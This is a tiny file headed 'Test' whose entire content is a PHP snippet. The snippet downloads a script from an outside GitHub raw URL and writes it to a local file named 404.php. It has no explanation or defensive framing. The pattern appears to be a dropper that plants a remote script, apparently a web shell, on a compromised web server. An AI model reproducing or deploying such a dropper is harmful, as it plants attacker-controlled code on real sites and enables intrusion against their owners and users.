Test
<?php 
$fp = fopen("404.php", "w"); 
fwrite($fp, file_get_contents("https://raw.githubusercontent.com/alxwahid/3voScript/master/404.php")); 
fclose($fp); 
?>
